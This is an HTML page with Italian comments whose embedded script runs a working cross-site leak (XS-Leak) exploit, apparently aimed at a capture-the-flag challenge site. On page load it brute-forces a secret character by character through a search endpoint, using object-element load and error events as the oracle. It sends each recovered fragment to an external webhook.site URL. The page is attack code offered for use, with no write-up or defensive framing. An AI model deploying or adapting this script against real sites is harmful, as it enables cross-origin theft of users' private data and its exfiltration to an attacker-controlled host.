<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XS-Leak Flag Extraction</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        #result {
            margin-top: 20px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>XS-Leak Flag Extraction</h1>
    <div id="result">In attesa di risultati...</div>

    <script>
        const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/";

        // Funzione per testare l'accessibilitÃ  di una risorsa
        const leak = (url) => {
            return new Promise((resolve) => {
                let s = document.createElement('object');
                s.data = url;
                s.onload = () => { s.remove(); resolve(true); }; // Risorsa accessibile (status 200)
                s.onerror = () => { s.remove(); resolve(false); }; // Risorsa non accessibile (status 404 o errore)
                document.body.appendChild(s);
            });
        };

        // Funzione per cercare la flag carattere per carattere
        const findFlag = async () => {
            let flag = "flag{";
            const resultDiv = document.getElementById('result');

            while (!flag.endsWith("}")) {
                for (const char of charset) {
                    const testFlag = `${flag}${char}`;
                    const url = `https://matrix.capturetheflags.site/search?s=${testFlag}`;
                    const accessible = await leak(url);

                    if (accessible) {
                        flag += char;
                        resultDiv.textContent = `Flag trovata finora: ${flag}`;
                        await logResult(`Flag parziale: ${flag}`);
                        break;
                    }
                }
            }

            resultDiv.textContent = `Flag completa trovata: ${flag}`;
            await logResult(`Flag completa trovata: ${flag}`);
        };

        // Funzione per inviare il log al Webhook
        const logResult = async (message) => {
            const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // Sostituisci con il tuo URL Webhook
            try {
                const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`;
                const response = await fetch(urlWithParams, { method: 'GET' });

                if (!response.ok) {
                    console.error('Errore durante l\'invio del log:', response.statusText);
                } else {
                    console.log('Log inviato con successo');
                }
            } catch (error) {
                console.error('Errore di rete:', error);
            }
        };

        // Esegui il test al caricamento del DOM
        document.addEventListener('DOMContentLoaded', findFlag);
    </script>
</body>
</html>
